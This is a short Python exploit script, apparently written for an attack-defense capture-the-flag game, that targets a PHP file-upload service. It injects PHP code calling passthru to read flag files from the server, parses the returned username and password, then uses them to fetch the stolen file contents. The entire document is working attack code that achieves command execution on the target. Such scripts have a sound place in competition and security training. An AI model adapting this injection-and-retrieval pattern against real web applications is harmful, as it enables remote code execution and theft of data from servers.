import sys
import re
import requests

def exploit(ip, port, flag_id):
    url = 'http://' + ip + ':' + str(port) + '/uploadFile.php?text=<?php\n\techo passthru("cat /opt/ctf/text_file_store/rw/' + flag_id + '_*");\n?>'
    r = requests.post(url, data = {})

    assert r.status_code == 200
    username = re.search(r'Username: ([0-9a-f]+)', r.text).group(1)
    password = re.search(r'Password: ([0-9a-f]+)', r.text).group(1)
    flag = requests.post('http://' + ip + ':' + str(port) + '/viewFile.php' + '?userName=' + username + '&userPassword=' + password , data = {
        })
    flag = flag.text

    return { 'FLAG': str(flag) }

